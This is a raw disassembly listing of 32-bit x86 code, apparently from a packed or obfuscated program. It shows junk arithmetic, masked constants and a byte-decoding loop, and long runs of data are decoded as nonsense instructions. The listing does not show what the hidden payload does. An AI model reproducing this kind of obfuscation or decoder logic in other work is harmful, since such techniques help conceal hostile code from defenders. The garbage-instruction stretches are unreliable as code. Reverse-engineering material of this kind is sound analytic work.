  4160cc:	or     DWORD PTR ds:0x4282ab,0x4a59
  4160d6:	mov    ecx,DWORD PTR ds:0x42827f
  4160dc:	sub    DWORD PTR ds:0x4281db,ecx
  4160e2:	add    DWORD PTR ds:0x4282cf,0x16e5
  4160ec:	dec    ecx
  4160ed:	mov    DWORD PTR [ebp-0x34],eax
  4160f0:	mov    eax,ds:0x4225a8
  4160f5:	and    ecx,DWORD PTR ds:0x4282bf
  4160fb:	mov    DWORD PTR [ebp-0x34],eax
  4160fe:	mov    eax,DWORD PTR [ebp-0xc]
  416101:	mov    DWORD PTR [ebp-0x14],eax
  416104:	xor    DWORD PTR ds:0x4283cb,ecx
  41610a:	mov    ecx,DWORD PTR [ebp-0x14]
  41610d:	or     DWORD PTR ds:0x4283e3,0x5817
  416117:	push   0x4
  416119:	cmp    DWORD PTR ds:0x4281db,0x0
  416120:	mov    DWORD PTR ds:0x4283c3,0x7b16
  41612a:	mov    DWORD PTR ds:0x4281df,0x195b
  416134:	jmp    0x41618b
  416139:	mov    DWORD PTR ds:0x4282bb,0x5f2a
  416143:	cmp    DWORD PTR ds:0x4281db,0x0
  41614a:	jle    0x41616d
  416150:	push   DWORD PTR [ebp-0x20]
  416153:	call   DWORD PTR ds:0x428f40
  416159:	xor    DWORD PTR ds:0x4281b7,0x4281ab
  416163:	sub    DWORD PTR ds:0x4281a3,0x4281cf
  41616d:	sbb    DWORD PTR ds:0x4282df,0x4282d7
  416177:	and    DWORD PTR ds:0x4282cf,0x56d1
  416181:	xor    DWORD PTR ds:0x4282bb,0x1431
  41618b:	pop    eax
  41618c:	or     DWORD PTR ds:0x4282af,0x4281eb
  416196:	sub    eax,ecx
  416198:	mov    ecx,DWORD PTR [ebp-0x10]
  41619b:	add    ecx,eax
  41619d:	mov    DWORD PTR [ebp-0x24],ecx
  4161a0:	mov    ecx,DWORD PTR ds:0x42825f
  4161a6:	mov    ecx,DWORD PTR [ecx]
  4161a8:	sbb    DWORD PTR ds:0x4281e3,ecx
  4161ae:	lea    eax,[ebp-0x30]
  4161b1:	mov    DWORD PTR [ebp-0x2c],eax
  4161b4:	and    eax,0x1e1b
  4161b9:	mov    eax,DWORD PTR [ebp-0x1c]
  4161bc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4161bf:	xor    eax,edi
  4161c1:	xor    ecx,ebx
  4161c3:	sub    DWORD PTR ds:0x4281db,0x4282b7
  4161cd:	shr    eax,0x2
  4161d0:	and    DWORD PTR ds:0x4282db,0x42829b
  4161da:	shl    ecx,0x1e
  4161dd:	sbb    DWORD PTR ds:0x428367,0x42827b
  4161e7:	or     eax,ecx
  4161e9:	or     DWORD PTR ds:0x4282d3,0x697f
  4161f3:	mov    DWORD PTR [ebp-0x20],eax
  4161f6:	mov    DWORD PTR [ebp-0x8],0xa4069abe
  4161fd:	mov    eax,DWORD PTR [ebp-0x8]
  416200:	mov    ecx,DWORD PTR [ebp-0x8]
  416203:	xor    eax,edi
  416205:	xor    ecx,ebx
  416207:	shr    eax,0x2
  41620a:	shl    ecx,0x1e
  41620d:	or     ecx,eax
  41620f:	push   ecx
  416210:	lea    eax,[ebp-0x8]
  416213:	push   eax
  416214:	lea    eax,[ebp-0x7c]
  416217:	push   eax
  416218:	call   0x415231
  41621d:	mov    eax,DWORD PTR [ebp-0x8]
  416220:	mov    ecx,DWORD PTR [ebp-0x8]
  416223:	xor    eax,edi
  416225:	xor    ecx,ebx
  416227:	shr    eax,0x2
  41622a:	shl    ecx,0x1e
  41622d:	or     ecx,eax
  41622f:	push   ecx
  416230:	lea    eax,[ebp-0x14]
  416233:	push   eax
  416234:	mov    eax,DWORD PTR [ebp+0x8]
  416237:	mov    ecx,DWORD PTR [ebp+0xc]
  41623a:	shrd   eax,ecx,0x2
  41623e:	shr    ecx,0x2
  416241:	mov    ecx,DWORD PTR [ebp+0x8]
  416244:	mov    edx,DWORD PTR [ebp+0xc]
  416247:	xor    eax,esi
  416249:	xor    edx,edx
  41624b:	or     eax,edx
  41624d:	lea    eax,[ebp+eax*4-0x78]
  416251:	push   eax
  416252:	shl    ecx,0x1e
  416255:	call   0x415231
  41625a:	mov    eax,DWORD PTR [ebp-0x8]
  41625d:	mov    ecx,DWORD PTR [ebp-0x8]
  416260:	xor    eax,edi
  416262:	xor    ecx,ebx
  416264:	shr    eax,0x2
  416267:	shl    ecx,0x1e
  41626a:	or     ecx,eax
  41626c:	push   ecx
  41626d:	lea    eax,[ebp-0x24]
  416270:	push   eax
  416271:	mov    eax,DWORD PTR [ebp+0x10]
  416274:	mov    ecx,DWORD PTR [ebp+0x14]
  416277:	shrd   eax,ecx,0x2
  41627b:	shr    ecx,0x2
  41627e:	mov    ecx,DWORD PTR [ebp+0x10]
  416281:	mov    edx,DWORD PTR [ebp+0x14]
  416284:	xor    eax,esi
  416286:	xor    edx,edx
  416288:	or     eax,edx
  41628a:	lea    eax,[ebp+eax*4-0x78]
  41628e:	push   eax
  41628f:	shl    ecx,0x1e
  416292:	call   0x415231
  416297:	mov    eax,DWORD PTR [ebp-0x8]
  41629a:	mov    ecx,DWORD PTR [ebp-0x8]
  41629d:	xor    ecx,ebx
  41629f:	xor    eax,edi
  4162a1:	shl    ecx,0x1e
  4162a4:	shr    eax,0x2
  4162a7:	or     ecx,eax
  4162a9:	push   ecx
  4162aa:	lea    eax,[ebp-0x20]
  4162ad:	push   eax
  4162ae:	mov    eax,DWORD PTR [ebp+0x10]
  4162b1:	mov    ecx,DWORD PTR [ebp+0x14]
  4162b4:	shrd   eax,ecx,0x2
  4162b8:	shr    ecx,0x2
  4162bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4162be:	mov    edx,DWORD PTR [ebp+0x14]
  4162c1:	xor    edx,edx
  4162c3:	xor    eax,esi
  4162c5:	or     eax,edx
  4162c7:	shl    ecx,0x1e
  4162ca:	mov    ecx,DWORD PTR [ebp+0x10]
  4162cd:	mov    edx,DWORD PTR [ebp+0x14]
  4162d0:	shrd   ecx,edx,0x2
  4162d4:	shr    edx,0x2
  4162d7:	mov    edx,DWORD PTR [ebp+0x10]
  4162da:	mov    ebx,DWORD PTR [ebp+0x14]
  4162dd:	xor    ecx,esi
  4162df:	xor    ebx,ebx
  4162e1:	or     ecx,ebx
  4162e3:	add    eax,ecx
  4162e5:	lea    eax,[ebp+eax*4-0x78]
  4162e9:	push   eax
  4162ea:	shl    edx,0x1e
  4162ed:	call   0x415231
  4162f2:	mov    eax,DWORD PTR [ebp-0x8]
  4162f5:	mov    ecx,DWORD PTR [ebp-0x8]
  4162f8:	xor    ecx,0xfffffffe
  4162fb:	shl    ecx,0x1e
  4162fe:	jmp    0x41655e
  416303:	sbb    eax,0x26add60b
  416308:	lods   eax,DWORD PTR ds:[esi]
  416309:	sbb    bh,BYTE PTR [edx-0x45]
  41630c:	xor    bl,BYTE PTR [ebx+0x70]
  41630f:	sbb    cl,cl
  416311:	pop    ecx
  416312:	stos   BYTE PTR es:[edi],al
  416313:	hlt    
  416314:	add    BYTE PTR [esi],dl
  416316:	sbb    BYTE PTR [ebx+0x79181814],bl
  41631c:	lahf   
  41631d:	or     eax,0xc7341127
  416322:	inc    eax
  416323:	out    dx,eax
  416324:	or     esi,DWORD PTR [esi+ebp*1+0x5c402a62]
  41632b:	mov    edi,eax
  41632d:	xlat   BYTE PTR ds:[ebx]
  41632e:	sbb    DWORD PTR [esi+0x60],edx
  416331:	(bad)
  416336:	repnz aas 
  416338:	outs   dx,BYTE PTR ds:[esi]
  416339:	push   ss
  41633a:	jbe    0x416316
  41633c:	loop   0x4162c1
  41633e:	mov    eax,ds:0x7af97e6a
  416343:	inc    edx
  416344:	pop    ss
  416345:	pusha  
  416346:	jp     0x4162d0
  416348:	cmp    ecx,0xffffff81
  41634b:	mov    cl,0x16
  41634d:	icebp  
  41634e:	xchg   edx,eax
  41634f:	mov    eax,0xa62a6183
  416354:	mov    ecx,0x15afb7ba
  416359:	rcr    BYTE PTR [esi],0xe5
  41635c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41635d:	xchg   edi,eax
  41635e:	sub    al,0xde
  416360:	adc    eax,0xe87c8a8a
  416365:	jne    0x4163b4
  416367:	stos   BYTE PTR es:[edi],al
  416368:	jo     0x4163b5
  41636a:	dec    ebp
  41636b:	cmp    al,0xa1
  41636d:	in     al,dx
  41636e:	(bad)  
  416370:	call   0x5e8f:0xc0d7a870
  416377:	push   ss
  416378:	fucomi st,st(0)
  41637a:	adc    DWORD PTR [eax+0x54],edi
  41637d:	fwait
  41637e:	push   0x41
  416380:	inc    ebx
  416381:	fsubr  st,st(5)
  416383:	nop
  416384:	jns    0x4163e3
  416386:	dec    ecx
  416387:	mov    WORD PTR [edx+0x21c66a1e],gs
  41638d:	sub    ecx,DWORD PTR [ebx-0x49]
  416390:	sbb    ebx,eax
  416392:	sbb    al,0x59
  416394:	(bad)  
  416395:	lods   eax,DWORD PTR ds:[esi]
  416396:	cmp    edx,DWORD PTR [edx]
  416398:	(bad)  
  416399:	mov    esi,0xd4545312
  41639e:	pop    ebp
  41639f:	loop   0x416390
  4163a1:	sti    
  4163a2:	dec    edx
  4163a3:	dec    ebp
  4163a4:	dec    ebx
  4163a5:	je     0x4163d6
  4163a7:	pushf  
  4163a8:	enter  0xf129,0x91
  4163ac:	jnp    0x416357
  4163ae:	jo     0x416337
  4163b0:	lock jmp DWORD PTR [ecx]
  4163b3:	mov    eax,ds:0x4c20c211
  4163b8:	out    dx,al
  4163b9:	xor    DWORD PTR [esi-0x16],ecx
  4163bc:	pop    edi
  4163bd:	retf   
  4163be:	retf   0x2d78
  4163c1:	loope  0x41639e
  4163c3:	scas   al,BYTE PTR es:[edi]
  4163c4:	dec    ebp
  4163c5:	push   es
  4163c6:	pop    ebx
  4163c7:	mov    esi,0x29015ee0
  4163cc:	pop    ebx
  4163cd:	mov    eax,0xa1661aa4
  4163d2:	jae    0x416441
  4163d4:	in     al,dx
  4163d5:	jo     0x4163fd
  4163d7:	test   BYTE PTR [ebx+0x2f272579],bh
  4163dd:	test   al,0x3b
  4163df:	cmp    bh,BYTE PTR [eax+0x197fc617]
  4163e5:	add    BYTE PTR [ebx],ch
  4163e7:	pushf  
  4163e8:	shr    BYTE PTR [ecx+ecx*4+0x196b4067],1
  4163ef:	mov    bl,0xee
  4163f1:	pop    es
  4163f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163f3:	pcmpgtd mm5,mm2
  4163f6:	lock xchg esp,eax
  4163f8:	popa   
  4163f9:	gs jnp 0x4163fa
  4163fc:	int3   
  4163fd:	and    eax,0xf3805ac6
  416402:	clc    
  416403:	xor    al,0x47
  416405:	adc    BYTE PTR [ebx-0x7ec4e4da],bl
  41640b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41640c:	cwde   
  41640d:	sar    BYTE PTR [ebp-0x1a7e31c4],cl
  416413:	mov    eax,0xe6765424
  416419:	mov    cl,0xbf
  41641b:	and    BYTE PTR [edx],0x80
  41641e:	push   es
  41641f:	(bad)  
  416420:	addr16 cli 
  416422:	rcl    BYTE PTR [ebx-0x19],0xa7
  416426:	mov    esp,0xca69cb85
  41642b:	adc    dl,BYTE PTR [esi]
  41642d:	dec    eax
  41642e:	lea    ebp,es:[edx+ebp*8]
  416432:	cld    
  416433:	jmp    0xaf6700c8
  416438:	imul   edx,esi,0x6b268677
  41643e:	sub    BYTE PTR [edi+eax*4],dl
  416441:	mov    edx,DWORD PTR [edi+0x1]
  416444:	jns    0x4164a6
  416446:	das    
  416447:	mov    ebx,0x60055a16
  41644c:	mov    al,ds:0x5c802fa1
  416451:	or     al,BYTE PTR [ecx+0x4d]
  416454:	jg     0x4164c8
  416456:	jne    0x4163e2
  416458:	xor    ah,al
  41645a:	scas   al,BYTE PTR es:[edi]
  41645b:	mov    al,0xd0
  41645d:	stos   DWORD PTR es:[edi],eax
  41645e:	xchg   esp,eax
  41645f:	inc    ebp
  416460:	stos   BYTE PTR es:[edi],al
  416461:	add    eax,0x39e483f3
  416466:	pop    edi
  416467:	pop    edx
  416468:	and    ecx,esp
  41646a:	pop    edx
  41646b:	mov    dh,0xeb
  41646d:	push   cs
  41646e:	and    BYTE PTR [edi+0x20],cl
  416471:	dec    ecx
  416472:	add    BYTE PTR [esi+0x45d299d9],al
  416478:	imul   edi,DWORD PTR [ebx+0x5acbe273],0xb8465bf7
  416482:	jbe    0x4164e6
  416484:	addr16 dec esi
  416486:	jno    0x41642a
  416488:	mov    ch,0x34
  41648a:	sbb    al,0x58
  41648c:	adc    al,0xed
  41648e:	imul   eax,DWORD PTR [ecx],0x6751cb7a
  416494:	mov    ecx,0x78fc919b
  416499:	dec    esi
  41649a:	mov    esi,DWORD PTR [edi-0x19]
  41649d:	les    ebp,FWORD PTR [ecx+ebx*8-0x22431fa6]
  4164a4:	fdivr  QWORD PTR [eax+eax*4]
  4164a7:	ret    
  4164a8:	pop    es
  4164a9:	pusha  
  4164aa:	mov    ebx,DWORD PTR [eax+0x5f]
  4164ad:	mov    fs,WORD PTR ds:0x727c299a
  4164b3:	mov    DWORD PTR [ecx+0x63],esp
  4164b6:	sar    BYTE PTR [edx],0x9f
  4164b9:	xchg   BYTE PTR [edx-0x51],bh
  4164bc:	call   0x3d042d0f
  4164c1:	push   eax
  4164c2:	leave  
  4164c3:	cmp    bl,BYTE PTR [eax+0x4f]
  4164c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164c7:	xor    bl,BYTE PTR ds:0xbe3cfe64
  4164cd:	lock jbe 0x41650a
  4164d0:	push   0x74768a51
  4164d5:	icebp  
  4164d6:	lods   eax,DWORD PTR ds:[esi]
  4164d7:	cmc    
  4164d8:	es adc dh,ah
  4164db:	jnp    0x41654b
  4164dd:	pop    es
  4164de:	and    eax,0x15277a50
  4164e3:	in     al,dx
  4164e4:	shl    BYTE PTR [ebx+0x7c417927],cl
  4164ea:	jmp    0x4905a9f5
  4164ef:	mov    bl,0xf1
  4164f1:	xor    ch,BYTE PTR [edx-0x41]
  4164f4:	test   al,0xaa
  4164f6:	jle    0x4164f9
  4164f8:	sub    al,0xe8
  4164fa:	pop    edi
  4164fb:	lods   eax,DWORD PTR ds:[esi]
  4164fc:	mov    edx,0xdfe1d8f
  416501:	and    eax,0x8f2277ed
  416506:	add    BYTE PTR [ecx-0x7],dl
  416509:	push   esp
  41650a:	mov    dh,0x6d
  41650c:	fadd   QWORD PTR [edi+0x2c82a1e9]
  416512:	xchg   edx,esi
  416514:	mov    ds:0xa2b3d377,eax
  416519:	adc    eax,DWORD PTR [esi-0x2fa26fc8]
  41651f:	scas   eax,DWORD PTR es:[edi]
  416520:	shr    DWORD PTR [ecx],cl
  416522:	out    0x1,eax
  416524:	popa   
  416525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416526:	push   0x37527ed5
  41652b:	pop    esi
  41652c:	call   0xb4c3bb95
  416531:	fst    QWORD PTR [ebx+0x7b]
  416534:	inc    esp
  416535:	nop
  416536:	pop    ds
  416537:	xlat   BYTE PTR ds:[ebx]
  416538:	pop    ds
  416539:	sub    edi,ebp
  41653b:	sub    esi,DWORD PTR [esp+edx*1]
  41653e:	dec    DWORD PTR [ebx-0x2a]
  416541:	daa    
  416542:	mul    bh
  416544:	pop    ebp
  416545:	retf   
  416546:	mov    ds:0x5027096f,al
  41654b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41654c:	loope  0x41651c
  41654e:	push   ds
  41654f:	and    esi,DWORD PTR [edx+0x587eba7f]
  416555:	pop    esp
  416556:	or     eax,0x25c04fbb
  41655b:	out    0x8e,eax
  41655d:	mov    ah,0x33
  41655f:	mov    ecx,0xc80b02e8
  416565:	push   ecx
  416566:	lea    eax,[ebp-0x2c]
  416569:	push   eax
  41656a:	mov    eax,DWORD PTR [ebp+0x10]
  41656d:	mov    ecx,DWORD PTR [ebp+0x14]
  416570:	shrd   eax,ecx,0x2
  416574:	shr    ecx,0x2
  416577:	mov    ecx,DWORD PTR [ebp+0x10]
  41657a:	mov    edx,DWORD PTR [ebp+0x14]
  41657d:	xor    edx,edx
  41657f:	shl    ecx,0x1e
  416582:	mov    ecx,DWORD PTR [ebp+0x10]
  416585:	xor    eax,esi
  416587:	or     eax,edx
  416589:	mov    edx,DWORD PTR [ebp+0x14]
  41658c:	shrd   ecx,edx,0x2
  416590:	shr    edx,0x2
  416593:	mov    edx,DWORD PTR [ebp+0x10]
  416596:	mov    ebx,DWORD PTR [ebp+0x14]
  416599:	xor    ecx,esi
  41659b:	xor    ebx,ebx
  41659d:	or     ecx,ebx
  41659f:	shl    edx,0x1e
  4165a2:	add    eax,ecx
  4165a4:	mov    ecx,DWORD PTR [ebp+0x10]
  4165a7:	mov    edx,DWORD PTR [ebp+0x14]
  4165aa:	shrd   ecx,edx,0x2
  4165ae:	shr    edx,0x2
  4165b1:	xor    ecx,esi
  4165b3:	mov    edx,DWORD PTR [ebp+0x10]
  4165b6:	mov    ebx,DWORD PTR [ebp+0x14]
  4165b9:	xor    ebx,ebx
  4165bb:	or     ecx,ebx
  4165bd:	add    eax,ecx
  4165bf:	lea    eax,[ebp+eax*4-0x78]
  4165c3:	push   eax
  4165c4:	shl    edx,0x1e
  4165c7:	call   0x415231
  4165cc:	mov    eax,DWORD PTR [ebp-0x7c]
  4165cf:	mov    ecx,DWORD PTR [ebp-0x7c]
  4165d2:	xor    eax,edi
  4165d4:	xor    ecx,0xfffffffe
  4165d7:	shr    eax,0x2
  4165da:	shl    ecx,0x1e
  4165dd:	or     ecx,eax
  4165df:	mov    DWORD PTR [ebp-0x7c],ecx
  4165e2:	lea    eax,[ebp-0x7c]
  4165e5:	push   eax
  4165e6:	mov    eax,DWORD PTR [ebp+0x10]
  4165e9:	mov    ecx,DWORD PTR [ebp+0x14]
  4165ec:	shrd   eax,ecx,0x2
  4165f0:	shr    ecx,0x2
  4165f3:	mov    ecx,DWORD PTR [ebp+0x10]
  4165f6:	mov    edx,DWORD PTR [ebp+0x14]
  4165f9:	xor    eax,esi
  4165fb:	xor    edx,edx
  4165fd:	or     eax,edx
  4165ff:	push   eax
  416600:	mov    eax,ds:0x4225d8
  416605:	mov    edi,0x42251e
  41660a:	push   edi
  41660b:	push   DWORD PTR [eax]
  41660d:	shl    ecx,0x1e
  416610:	call   0x41e9f9
  416615:	lea    eax,[ebp-0x7c]
  416618:	push   eax
  416619:	mov    eax,DWORD PTR [ebp+0x10]
  41661c:	mov    ecx,DWORD PTR [ebp+0x14]
  41661f:	shrd   eax,ecx,0x2
  416623:	shr    ecx,0x2
  416626:	mov    ecx,DWORD PTR [ebp+0x10]
  416629:	mov    edx,DWORD PTR [ebp+0x14]
  41662c:	xor    eax,esi
  41662e:	xor    edx,edx
  416630:	or     eax,edx
  416632:	push   eax
  416633:	mov    eax,ds:0x4225d8
  416638:	push   edi
  416639:	push   DWORD PTR [eax]
  41663b:	shl    ecx,0x1e
  41663e:	call   0x41e9f9
  416643:	mov    eax,DWORD PTR [ebp-0x30]
  416646:	mov    eax,DWORD PTR [ebp-0x20]
  416649:	mov    edi,DWORD PTR [ebp-0x14]
  41664c:	mov    eax,DWORD PTR [ebp-0x24]
  41664f:	mov    ecx,edi
  416651:	mov    DWORD PTR [ebp-0x1c],eax
  416654:	rol    ecx,0x2
  416657:	mov    eax,0xa4069aae
  41665c:	xor    ecx,eax
  41665e:	cmp    ecx,eax
  416660:	je     0x416bfd
  416666:	mov    edx,0x1001
  41666b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41666e:	xor    eax,eax
  416670:	test   ecx,ecx
  416672:	je     0x41669d
  416678:	mov    bl,BYTE PTR [eax+edi*1]
  41667b:	mov    BYTE PTR [ebp-0x1],bl
  41667e:	movzx  ebx,BYTE PTR [ebp-0x1]
  416682:	sub    ebx,0xec
  416688:	mov    BYTE PTR [ebp-0x1],bl
  41668b:	ror    BYTE PTR [ebp-0x1],1
  41668e:	mov    bl,BYTE PTR [ebp-0x1]
  416691:	mov    BYTE PTR [eax+edi*1],bl
  416694:	inc    eax
  416695:	cmp    eax,ecx
  416697:	jb     0x416678
  41669d:	dec    edx
  41669e:	jne    0x41666b
  4166a4:	mov    eax,DWORD PTR [ebp+0x8]
  4166a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4166aa:	shrd   eax,ecx,0x2
  4166ae:	shr    ecx,0x2
  4166b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4166b4:	mov    edx,DWORD PTR [ebp+0xc]
  4166b7:	xor    eax,esi
  4166b9:	xor    edx,edx
  4166bb:	or     eax,edx
  4166bd:	push   0x1
  4166bf:	add    eax,edi
  4166c1:	push   eax
  4166c2:	lea    eax,[ebp-0x2]
  4166c5:	push   eax
  4166c6:	shl    ecx,0x1e
  4166c9:	call   0x415231
  4166ce:	mov    eax,DWORD PTR [ebp+0x10]
  4166d1:	mov    ecx,DWORD PTR [ebp+0x14]
  4166d4:	shrd   eax,ecx,0x2
  4166d8:	shr    ecx,0x2
  4166db:	mov    ecx,DWORD PTR [ebp+0x10]
  4166de:	mov    edx,DWORD PTR [ebp+0x14]
  4166e1:	xor    eax,esi
  4166e3:	xor    edx,edx
  4166e5:	or     eax,edx
  4166e7:	add    eax,edi
  4166e9:	push   0x1
  4166eb:	push   eax
  4166ec:	mov    eax,DWORD PTR [ebp+0x8]
  4166ef:	shl    ecx,0x1e
  4166f2:	mov    ecx,DWORD PTR [ebp+0xc]
  4166f5:	shrd   eax,ecx,0x2
  4166f9:	shr    ecx,0x2
  4166fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4166ff:	mov    edx,DWORD PTR [ebp+0xc]
  416702:	xor    eax,esi
  416704:	xor    edx,edx
  416706:	or     eax,edx
  416708:	add    eax,edi
  41670a:	push   eax
  41670b:	shl    ecx,0x1e
  41670e:	call   0x415231
  416713:	push   0x1
  416715:	jmp    0x416975
  41671a:	out    dx,eax
  41671b:	(bad)
  41671f:	mov    dl,0x2a
  416721:	dec    esi
  416722:	xchg   ebx,eax
  416723:	fistp  WORD PTR [ebp+0x371a6170]
  416729:	push   0x77
  41672b:	cld    
  41672c:	push   ss
  41672d:	sbb    BYTE PTR [ebx+0x5e181814],bl
  416733:	push   ebx
  416734:	xchg   esi,eax
  416735:	es sub edi,esi
  416738:	imul   edx,DWORD PTR [eax],0x7f
  41673b:	cld    
  41673c:	xor    dh,dl
  41673e:	je     0x4167be
  416740:	stos   DWORD PTR es:[edi],eax
  416741:	test   BYTE PTR [ebx-0x7b93618a],dl
  416747:	jb     0x416743
  416749:	mov    dl,0x23
  41674b:	pusha  
  41674c:	leave  
  41674d:	fld    TBYTE PTR [ecx-0x63]
  416750:	push   ss
  416751:	jl     0x416720
  416753:	addr16 in al,0x77
  416756:	mov    ah,0x86
  416758:	fmul   st,st(3)
  41675a:	cmp    BYTE PTR [ebx+0x76],0xd5
  41675e:	jbe    0x41675e
  416760:	inc    ebp
  416761:	mov    ebx,0xc0dd41f8
  416766:	lea    esp,[edi-0x65]
  416769:	das    
  41676a:	and    cl,BYTE PTR [esi+0x576c972c]
  416770:	mov    edx,0xf05a4389
  416775:	(bad)  
  416776:	test   al,0x5d
  416778:	sub    al,0x8
  41677a:	xor    DWORD PTR [ecx+0x10dbdc67],esp
  416780:	test   al,0xbb
  416782:	test   DWORD PTR [ebx+0x2587f18d],eax
  416788:	or     dl,BYTE PTR [ebx-0x7be808f9]
  41678e:	mov    ds:0xf6eed512,eax
  416793:	popf   
  416794:	dec    ecx
  416795:	cmp    ebp,ecx
  416797:	test   dl,al
  416799:	test   BYTE PTR [edi-0x10],dh
  41679c:	adc    DWORD PTR [ecx],esi
  41679e:	dec    ebp
  41679f:	jb     0x416808
  4167a1:	pop    es
  4167a2:	ins    DWORD PTR es:[edi],dx
  4167a3:	fild   DWORD PTR [ebp-0x68b63655]
  4167a9:	stc    
  4167aa:	mov    esi,0x29d0e104
  4167af:	cmp    esi,DWORD PTR [esi+0x28e1d430]
  4167b5:	xor    BYTE PTR [ecx+0x61],cl
  4167b8:	push   eax
  4167b9:	mov    edi,DWORD PTR [ebx]
  4167bb:	xchg   esi,eax
  4167bc:	and    BYTE PTR cs:[esi+0x2e],ah
  4167c0:	into   
  4167c1:	cld    
  4167c2:	jmp    0x93da:0x21da8295
  4167c9:	bound  ebp,QWORD PTR [eax-0x4a]
  4167cc:	mov    cl,0xf1
  4167ce:	rcl    cl,0x16
  4167d1:	call   0x7d31:0xeb401b95
  4167d8:	jmp    0x3474:0xb5778170
  4167df:	pop    esp
  4167e0:	add    eax,0xee961896
  4167e5:	in     al,0x95
  4167e7:	pop    ecx
  4167e8:	xchg   esp,eax
  4167e9:	cmp    ecx,DWORD PTR [ebx]
  4167eb:	packuswb mm2,QWORD PTR [esi-0x4df0d930]
  4167f2:	das    
  4167f3:	(bad)  
  4167f4:	xchg   ebp,eax
  4167f5:	or     eax,0xdd48c8fc
  4167fa:	pop    es
  4167fb:	test   BYTE PTR [edi+0x26],ah
  4167fe:	add    eax,ecx
  416800:	and    edx,DWORD PTR [edx-0x7e3a957e]
  416806:	repnz es mov edi,0xc55c275a
  41680d:	lods   eax,DWORD PTR ds:[esi]
  41680e:	mov    esp,0x1013c643
  416813:	popa   
  416814:	loopne 0x4167a5
  416816:	mov    bl,0x23
  416818:	jnp    0x416817
  41681a:	test   eax,0xec4d2dcd
  41681f:	adc    eax,DWORD PTR [esi+0x7bf4982d]
  416825:	inc    edi
  416826:	mov    ebp,gs
  416828:	loopne 0x41687b
  41682a:	adc    DWORD PTR [ecx-0x6396c028],0x7a593033
  416834:	lahf   
  416835:	inc    esi
  416836:	in     al,0xfd
  416838:	lea    ebp,[esi]
  41683a:	inc    ecx
  41683b:	push   eax
  41683c:	pop    edx
  41683d:	add    al,0x5
  41683f:	cmp    esp,esi
  416841:	js     0x4167d8
  416843:	xor    BYTE PTR [ecx],0xfc
  416846:	xchg   esi,eax
  416847:	inc    ecx
  416848:	in     eax,0x9
  41684a:	gs and eax,0x4badc451
  416850:	jecxz  0x4168b4
  416852:	jns    0x41688d
  416854:	jae    0x416888
  416856:	sti    
  416857:	mov    bl,0xc8
  416859:	sub    al,0x66
  41685c:	popa   
  41685d:	imul   ebx,DWORD PTR [ebp+0x76],0xffffffb8
  416861:	sbb    al,0x55
  416863:	jae    0x416864
  416865:	cmp    edx,edi
  416867:	loope  0x4167f0
  416869:	sub    eax,0x9688349c
  41686e:	bound  eax,QWORD PTR [ebx-0x43e5b2c3]
  416874:	cmp    BYTE PTR [ebx-0x38],al
  416877:	fcom   DWORD PTR [ebx]
  416879:	clc    
  41687a:	iret   
  41687b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41687c:	mov    ebx,DWORD PTR [ebx]
  41687e:	and    edi,eax
  416880:	(bad)  
  416881:	cli    
  416882:	pusha  
  416883:	or     DWORD PTR ds:[esi-0x449b097b],ebp
  41688a:	mov    esp,0x7faf2871
  41688f:	test   al,0xe6
  416891:	(bad)  
  416892:	sub    BYTE PTR es:[eax+0x4a],al
  416896:	add    BYTE PTR [ecx-0x51],dh
  416899:	xor    al,0x5a
  41689b:	pop    edi
  41689c:	les    edx,FWORD PTR [ecx+0xe9d13bb]
  4168a2:	cmc    
  4168a3:	test   edx,ebx
  4168a5:	or     edx,DWORD PTR [edi]
  4168a7:	int    0x13
  4168a9:	stos   DWORD PTR es:[edi],eax
  4168aa:	int    0xa3
  4168ac:	dec    eax
  4168ad:	cmp    DWORD PTR [eax+ecx*4],eax
  4168b0:	mov    dh,0xef
  4168b2:	add    al,0x47
  4168b4:	xor    eax,0x779916c2
  4168b9:	es inc esp
  4168bb:	inc    eax
  4168bc:	cwde   
  4168bd:	mov    DWORD PTR [edx+0x7e023c0b],edx
  4168c3:	fadd   st,st(4)
  4168c5:	push   cs
  4168c6:	outs   dx,BYTE PTR ds:[esi]
  4168c7:	cmc    
  4168c8:	jp     0x4168d7
  4168ca:	jo     0x416923
  4168cc:	push   edx
  4168cd:	fs sahf 
  4168cf:	es in  eax,0xb5
  4168d2:	sbb    eax,0x5275ec0f
  4168d7:	adc    ebp,esi
  4168d9:	inc    esi
  4168da:	add    eax,DWORD PTR [ebp-0x62]
  4168dd:	mov    dl,0x55
  4168df:	mov    ah,0xfa
  4168e1:	aam    0x8c
  4168e3:	outs   dx,BYTE PTR ds:[esi]
  4168e4:	mov    ds:0x62b62e73,eax
  4168e9:	add    bl,BYTE PTR [ebp+0x8ee84e3]
  4168ef:	cmp    ebx,DWORD PTR [ebx]
  4168f1:	sbb    DWORD PTR [eax-0x17],ebx
  4168f4:	mov    ebx,0xe6f6b92
  4168f9:	mov    bl,0xe6
  4168fb:	enter  0xea9c,0x1a
  4168ff:	pop    ebp
  416900:	mov    esp,esp
  416902:	and    al,0x89
  416904:	and    BYTE PTR [edi+0x29855056],al
  41690a:	adc    ebx,DWORD PTR [ebx-0x480d979d]
  416910:	cmp    BYTE PTR [ebx+0x9],bh
  416913:	sbb    eax,0x9a34dbd9
  416918:	jp     0x4168e1
  41691a:	pop    ebx
  41691b:	sbb    edi,eax
  41691d:	daa    
  41691e:	nop
  41691f:	dec    edi
  416920:	adc    BYTE PTR [ecx],bl
  416922:	clc    
  416923:	ins    DWORD PTR es:[edi],dx
  416924:	(bad)  
  416926:	inc    eax
  416927:	retf   
  416928:	idiv   DWORD PTR [eax-0x4827cfb3]
  41692e:	cli    
  41692f:	out    0xc9,eax
  416931:	inc    ebp
  416932:	mov    ebx,0xef2e0b33
  416937:	and    eax,0x3f44e09f
  41693c:	cmp    edx,DWORD PTR [edx-0x1b]
  41693f:	lods   eax,DWORD PTR ds:[esi]
  416940:	push   ds
